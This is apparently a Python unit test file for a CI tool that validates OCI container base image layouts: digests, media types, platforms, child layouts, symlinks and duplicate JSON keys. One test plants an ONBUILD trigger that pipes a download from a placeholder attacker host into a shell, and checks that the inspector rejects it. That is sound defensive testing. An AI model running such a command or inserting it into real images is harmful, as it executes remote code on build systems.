from __future__ import annotations

import hashlib
import json
from pathlib import Path
import shutil
import sys
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from ci_workflows.oci_base_inspection import (  # noqa: E402
    OciBaseInspectionError,
    inspect_oci_base_layout,
    inspect_oci_base_root_layout,
)

INDEX = "application/vnd.oci.image.index.v1+json"
MANIFEST = "application/vnd.oci.image.manifest.v1+json"
CONFIG = "application/vnd.oci.image.config.v1+json"
LAYER = "application/vnd.oci.image.layer.v1.tar+gzip"
AMD64 = "linux/amd64"
ARM64 = "linux/arm64/v8"


def _json_bytes(value: object) -> bytes:
    return json.dumps(value, sort_keys=True, separators=(",", ":")).encode("utf-8")


def _platform(value: str) -> dict[str, str]:
    if value == AMD64:
        return {"os": "linux", "architecture": "amd64"}
    if value == ARM64:
        return {"os": "linux", "architecture": "arm64", "variant": "v8"}
    os_name, architecture, *variant = value.split("/")
    result = {"os": os_name, "architecture": architecture}
    if variant:
        result["variant"] = variant[0]
    return result


class LayoutBuilder:
    def __init__(self, root: Path) -> None:
        self.root = root
        (root / "blobs" / "sha256").mkdir(parents=True)
        (root / "oci-layout").write_bytes(_json_bytes({"imageLayoutVersion": "1.0.0"}))

    def blob(self, content: bytes, media_type: str) -> dict[str, object]:
        digest = "sha256:" + hashlib.sha256(content).hexdigest()
        (self.root / "blobs" / "sha256" / digest.removeprefix("sha256:")).write_bytes(content)
        return {"mediaType": media_type, "digest": digest, "size": len(content)}

    def image_manifest(
        self,
        platform: str,
        *,
        descriptor_platform: str | None = None,
        config_media_type: str = CONFIG,
        layer_media_type: str = LAYER,
        layer: bytes | None = None,
        omit_config_variant: bool = False,
        omit_runtime_config: bool = False,
        onbuild: list[str] | None = None,
    ) -> dict[str, object]:
        config_platform = _platform(platform)
        if omit_config_variant:
            config_platform.pop("variant", None)
        config: dict[str, object] = {
            **config_platform,
            "rootfs": {
                "type": "layers",
                "diff_ids": (
                    []
                    if layer is None
                    else ["sha256:" + hashlib.sha256(layer).hexdigest()]
                ),
            },
        }
        if not omit_runtime_config:
            config["config"] = {} if onbuild is None else {"OnBuild": onbuild}
        config_descriptor = self.blob(_json_bytes(config), config_media_type)
        layers: list[dict[str, object]] = []
        if layer is not None:
            layers.append(self.blob(layer, layer_media_type))
        manifest = {
            "schemaVersion": 2,
            "mediaType": MANIFEST,
            "config": config_descriptor,
            "layers": layers,
        }
        descriptor = self.blob(_json_bytes(manifest), MANIFEST)
        if descriptor_platform is not None:
            descriptor["platform"] = _platform(descriptor_platform)
        return descriptor

    def finish_direct(
        self,
        platform: str,
        *,
        declared_platform: str | None = None,
        config_media_type: str = CONFIG,
        layer_media_type: str = LAYER,
        layer: bytes | None = None,
        omit_config_variant: bool = False,
        omit_runtime_config: bool = False,
        onbuild: list[str] | None = None,
    ) -> tuple[str, dict[str, object]]:
        descriptor = self.image_manifest(
            platform,
            descriptor_platform=declared_platform,
            config_media_type=config_media_type,
            layer_media_type=layer_media_type,
            layer=layer,
            omit_config_variant=omit_config_variant,
            omit_runtime_config=omit_runtime_config,
            onbuild=onbuild,
        )
        self.write_root([descriptor])
        return str(descriptor["digest"]), descriptor

    def finish_index(
        self,
        platforms: tuple[str, ...],
        *,
        descriptor_platforms: tuple[str, ...] | None = None,
        nested_media_type: str = INDEX,
        extra_descriptors: tuple[dict[str, object], ...] = (),
    ) -> tuple[str, dict[str, object], list[dict[str, object]]]:
        declared = descriptor_platforms or platforms
        descriptors = [
            self.image_manifest(platform, descriptor_platform=declared[index])
            for index, platform in enumerate(platforms)
        ]
        return self.finish_descriptors(
            [*descriptors, *extra_descriptors],
            nested_media_type=nested_media_type,
        ) + (descriptors,)

    def finish_descriptors(
        self,
        descriptors: list[dict[str, object]],
        *,
        nested_media_type: str = INDEX,
    ) -> tuple[str, dict[str, object]]:
        nested = {
            "schemaVersion": 2,
            "mediaType": nested_media_type,
            "manifests": descriptors,
        }
        root_descriptor = self.blob(_json_bytes(nested), INDEX)
        self.write_root([root_descriptor])
        return str(root_descriptor["digest"]), root_descriptor

    def write_root(self, descriptors: list[dict[str, object]]) -> None:
        (self.root / "index.json").write_bytes(
            _json_bytes(
                {
                    "schemaVersion": 2,
                    "mediaType": INDEX,
                    "manifests": descriptors,
                }
            )
        )

    def child_layout(
        self,
        destination: Path,
        descriptor: dict[str, object],
    ) -> Path:
        child = LayoutBuilder(destination)
        shutil.copytree(
            self.root / "blobs" / "sha256",
            destination / "blobs" / "sha256",
            dirs_exist_ok=True,
        )
        child.write_root([descriptor])
        return destination


class OciBaseInspectionTests(unittest.TestCase):
    def test_nonempty_inherited_onbuild_is_rejected_before_import(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            digest, _ = builder.finish_direct(
                AMD64,
                onbuild=["RUN curl https://attacker.invalid/payload | sh"],
            )
            with self.assertRaisesRegex(OciBaseInspectionError, "oci_config_invalid"):
                inspect_oci_base_layout(
                    builder.root,
                    f"docker.io/library/base@{digest}",
                    (AMD64,),
                )

    def test_empty_inherited_onbuild_has_no_trigger_and_is_accepted(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            digest, _ = builder.finish_direct(AMD64, onbuild=[])
            evidence = inspect_oci_base_layout(
                builder.root,
                f"docker.io/library/base@{digest}",
                (AMD64,),
            )
            self.assertEqual(AMD64, evidence.platforms[0].platform)

    def test_rejects_zstd_layers_that_cpython_scanner_cannot_inspect(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            digest, _ = builder.finish_direct(
                AMD64,
                layer=b"zstd-looking-but-not-inspected",
                layer_media_type="application/vnd.oci.image.layer.v1.tar+zstd",
            )
            with self.assertRaisesRegex(OciBaseInspectionError, "oci_descriptor_invalid"):
                inspect_oci_base_layout(
                    builder.root,
                    f"docker.io/library/base@{digest}",
                    (AMD64,),
                )

    def test_multi_platform_index_returns_canonical_redacted_evidence(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            digest, _, descriptors = builder.finish_index((AMD64, ARM64))
            reference = f"registry.example/private-looking/base@{digest}"
            children = {
                AMD64: builder.child_layout(Path(temporary) / "child-amd64", descriptors[0]),
                ARM64: builder.child_layout(Path(temporary) / "child-arm64", descriptors[1]),
            }

            evidence = inspect_oci_base_layout(
                builder.root,
                reference,
                (ARM64, AMD64),
                children,
            )
            repeated = inspect_oci_base_layout(
                builder.root,
                reference,
                (AMD64, ARM64),
                children,
            )

            self.assertEqual(digest, evidence.reference_digest)
            self.assertEqual(digest, evidence.root_digest)
            self.assertEqual(INDEX, evidence.root_media_type)
            self.assertEqual((AMD64, ARM64), tuple(row.platform for row in evidence.platforms))
            self.assertEqual(
                tuple(str(row["digest"]) for row in descriptors),
                tuple(row.manifest_digest for row in evidence.platforms),
            )
            self.assertEqual(evidence, repeated)
            rendered = evidence.canonical_json()
            self.assertEqual(
                rendered,
                json.dumps(evidence.to_dict(), sort_keys=True, separators=(",", ":")),
            )
            self.assertNotIn("registry.example", rendered)
            self.assertNotIn("private-looking", rendered)
            payload = evidence.evidence_payload()
            self.assertEqual(
                hashlib.sha256(_json_bytes(payload)).hexdigest(),
                evidence.evidence_id,
            )

    def test_direct_manifest_uses_config_platform_identity(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            digest, descriptor = builder.finish_direct(AMD64)

            evidence = inspect_oci_base_layout(
                builder.root,
                f"docker.io/library/base@{digest}",
                (AMD64,),
            )

            self.assertEqual(MANIFEST, evidence.root_media_type)
            self.assertEqual(str(descriptor["digest"]), evidence.platforms[0].manifest_digest)
            self.assertRegex(evidence.platforms[0].config_digest, r"^sha256:[0-9a-f]{64}$")

    def test_direct_arm64_accepts_optional_variant_and_runtime_config(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            digest, _ = builder.finish_direct(
                ARM64,
                omit_config_variant=True,
                omit_runtime_config=True,
            )

            evidence = inspect_oci_base_layout(
                builder.root,
                f"docker.io/library/base@{digest}",
                (ARM64,),
            )

            self.assertEqual(ARM64, evidence.platforms[0].platform)

    def test_declared_reference_must_match_exact_root_digest(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            builder.finish_direct(AMD64)
            with self.assertRaisesRegex(OciBaseInspectionError, "oci_reference_digest_mismatch"):
                inspect_oci_base_layout(
                    builder.root,
                    "docker.io/library/base@sha256:" + "f" * 64,
                    (AMD64,),
                )

    def test_rejects_malformed_or_transport_style_reference(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            digest, _ = builder.finish_direct(AMD64)
            for reference in (
                "docker.io/library/base:latest",
                f"https://docker.io/library/base@{digest}",
                f"docker.io/library/base@{digest.upper()}",
                f"docker.io/library/base @${digest}",
            ):
                with self.subTest(reference=reference), self.assertRaisesRegex(
                    OciBaseInspectionError, "oci_reference_invalid"
                ):
                    inspect_oci_base_layout(builder.root, reference, (AMD64,))

    def test_rejects_descriptor_digest_and_size_mismatches(self) -> None:
        for field, expected in (("digest", "oci_digest_mismatch"), ("size", "oci_size_mismatch")):
            with self.subTest(field=field), tempfile.TemporaryDirectory() as temporary:
                builder = LayoutBuilder(Path(temporary))
                digest, descriptor = builder.finish_direct(AMD64)
                if field == "digest":
                    blob = builder.root / "blobs" / "sha256" / digest.removeprefix("sha256:")
                    content = blob.read_bytes()
                    blob.write_bytes(content[:-1] + bytes([content[-1] ^ 1]))
                else:
                    descriptor["size"] = int(descriptor["size"]) + 1
                    builder.write_root([descriptor])
                with self.assertRaisesRegex(OciBaseInspectionError, expected):
                    inspect_oci_base_layout(
                        builder.root,
                        f"docker.io/library/base@{digest}",
                        (AMD64,),
                    )

    def test_rejects_root_and_payload_media_type_mismatches(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            digest, descriptor = builder.finish_direct(AMD64)
            descriptor["mediaType"] = "application/vnd.docker.distribution.manifest.v2+json"
            builder.write_root([descriptor])
            with self.assertRaisesRegex(OciBaseInspectionError, "oci_descriptor_invalid"):
                inspect_oci_base_layout(
                    builder.root,
                    f"docker.io/library/base@{digest}",
                    (AMD64,),
                )

        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            digest, _, _ = builder.finish_index(
                (AMD64,), nested_media_type=MANIFEST
            )
            with self.assertRaisesRegex(OciBaseInspectionError, "oci_media_type_mismatch"):
                inspect_oci_base_layout(
                    builder.root,
                    f"docker.io/library/base@{digest}",
                    (AMD64,),
                )

    def test_rejects_missing_and_duplicate_requested_platforms(self) -> None:
        cases = (
            ((AMD64,), (AMD64, ARM64), None, "oci_platform_set_mismatch"),
            ((AMD64, AMD64), (AMD64,), None, "oci_platform_duplicate"),
            (("linux/s390x",), (AMD64,), None, "oci_platform_set_mismatch"),
        )
        for actual, requested, declared, expected in cases:
            with self.subTest(actual=actual), tempfile.TemporaryDirectory() as temporary:
                builder = LayoutBuilder(Path(temporary))
                digest, _, _ = builder.finish_index(
                    actual,
                    descriptor_platforms=declared,
                )
                with self.assertRaisesRegex(OciBaseInspectionError, expected):
                    inspect_oci_base_layout(
                        builder.root,
                        f"docker.io/library/base@{digest}",
                        requested,
                    )

    def test_index_only_root_allows_unrequested_platforms_and_attestations(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            attestation = {
                "mediaType": "application/vnd.example.attestation+json",
                "digest": "sha256:" + "e" * 64,
                "size": 411,
                "platform": {"os": "unknown", "architecture": "unknown"},
                "annotations": {"vnd.docker.reference.type": "attestation-manifest"},
            }
            digest, root_descriptor, descriptors = builder.finish_index(
                (AMD64, ARM64),
                extra_descriptors=(attestation,),
            )
            amd_child = builder.child_layout(
                Path(temporary) / "child-amd64",
                descriptors[0],
            )
            root_blob = root_descriptor["digest"].removeprefix("sha256:")
            for blob in (builder.root / "blobs" / "sha256").iterdir():
                if blob.name != root_blob:
                    blob.unlink()

            root_evidence = inspect_oci_base_root_layout(
                builder.root,
                f"docker.io/library/base@{digest}",
                (AMD64,),
            )
            evidence = inspect_oci_base_layout(
                builder.root,
                f"docker.io/library/base@{digest}",
                (AMD64,),
                {AMD64: amd_child},
            )

            self.assertEqual((AMD64,), tuple(row.platform for row in evidence.platforms))
            self.assertEqual(str(descriptors[0]["digest"]), evidence.platforms[0].manifest_digest)
            self.assertEqual(
                str(descriptors[0]["digest"]),
                root_evidence.manifests[0].manifest_digest,
            )
            self.assertEqual(
                int(descriptors[0]["size"]),
                root_evidence.manifests[0].manifest_size,
            )

    def test_index_child_layout_must_be_present_and_match_selected_digest(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            digest, _, descriptors = builder.finish_index((AMD64, ARM64))
            arm_child = builder.child_layout(
                Path(temporary) / "child-arm64",
                descriptors[1],
            )
            reference = f"docker.io/library/base@{digest}"

            with self.assertRaisesRegex(
                OciBaseInspectionError, "oci_child_layout_set_mismatch"
            ):
                inspect_oci_base_layout(builder.root, reference, (AMD64,), {})
            with self.assertRaisesRegex(
                OciBaseInspectionError, "oci_child_digest_mismatch"
            ):
                inspect_oci_base_layout(
                    builder.root,
                    reference,
                    (AMD64,),
                    {AMD64: arm_child},
                )

    def test_index_child_config_must_match_root_declared_platform(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            descriptor = builder.image_manifest(
                AMD64,
                descriptor_platform=ARM64,
            )
            digest, _ = builder.finish_descriptors([descriptor])
            child = builder.child_layout(Path(temporary) / "child", descriptor)

            with self.assertRaisesRegex(OciBaseInspectionError, "oci_platform_mismatch"):
                inspect_oci_base_layout(
                    builder.root,
                    f"docker.io/library/base@{digest}",
                    (ARM64,),
                    {ARM64: child},
                )

    def test_index_arm64_child_accepts_config_without_optional_variant(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            descriptor = builder.image_manifest(
                ARM64,
                descriptor_platform=ARM64,
                omit_config_variant=True,
            )
            digest, _ = builder.finish_descriptors([descriptor])
            child = builder.child_layout(Path(temporary) / "child", descriptor)

            evidence = inspect_oci_base_layout(
                builder.root,
                f"docker.io/library/base@{digest}",
                (ARM64,),
                {ARM64: child},
            )

            self.assertEqual(ARM64, evidence.platforms[0].platform)

    def test_rejects_manifest_and_config_platform_disagreement(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            digest, descriptor = builder.finish_direct(
                AMD64,
                declared_platform=ARM64,
            )
            with self.assertRaisesRegex(OciBaseInspectionError, "oci_platform_mismatch"):
                inspect_oci_base_layout(
                    builder.root,
                    f"docker.io/library/base@{digest}",
                    (AMD64,),
                )
            self.assertEqual(_platform(ARM64), descriptor["platform"])

    def test_rejects_wrong_config_media_type(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            digest, _ = builder.finish_direct(
                AMD64,
                config_media_type=MANIFEST,
            )
            with self.assertRaisesRegex(OciBaseInspectionError, "oci_descriptor_invalid"):
                inspect_oci_base_layout(
                    builder.root,
                    f"docker.io/library/base@{digest}",
                    (AMD64,),
                )

    def test_hashes_layers_and_rejects_corrupt_content(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            layer = b"a materialized base layer"
            digest, _ = builder.finish_direct(AMD64, layer=layer)
            layer_digest = hashlib.sha256(layer).hexdigest()
            (builder.root / "blobs" / "sha256" / layer_digest).write_bytes(b"x" * len(layer))

            with self.assertRaisesRegex(OciBaseInspectionError, "oci_digest_mismatch"):
                inspect_oci_base_layout(
                    builder.root,
                    f"docker.io/library/base@{digest}",
                    (AMD64,),
                )

    def test_rejects_symlinked_blob_without_dereferencing(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            digest, _ = builder.finish_direct(AMD64)
            blob = builder.root / "blobs" / "sha256" / digest.removeprefix("sha256:")
            outside = builder.root / "outside"
            outside.write_bytes(blob.read_bytes())
            blob.unlink()
            blob.symlink_to(outside)

            with self.assertRaisesRegex(OciBaseInspectionError, "oci_layout_malformed"):
                inspect_oci_base_layout(
                    builder.root,
                    f"docker.io/library/base@{digest}",
                    (AMD64,),
                )

    def test_rejects_duplicate_json_keys_and_multiple_root_descriptors(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            builder = LayoutBuilder(Path(temporary))
            digest, descriptor = builder.finish_direct(AMD64)
            (builder.root / "index.json").write_text(
                '{"schemaVersion":2,"schemaVersion":2,"mediaType":"'
                + INDEX
                + '","manifests":[]}',
                encoding="utf-8",
            )
            with self.assertRaisesRegex(OciBaseInspectionError, "oci_json_duplicate_key"):
                inspect_oci_base_layout(
                    builder.root,
                    f"docker.io/library/base@{digest}",
                    (AMD64,),
                )

            builder.write_root([descriptor, descriptor])
            with self.assertRaisesRegex(OciBaseInspectionError, "oci_root_descriptor_invalid"):
                inspect_oci_base_layout(
                    builder.root,
                    f"docker.io/library/base@{digest}",
                    (AMD64,),
                )


if __name__ == "__main__":
    unittest.main()
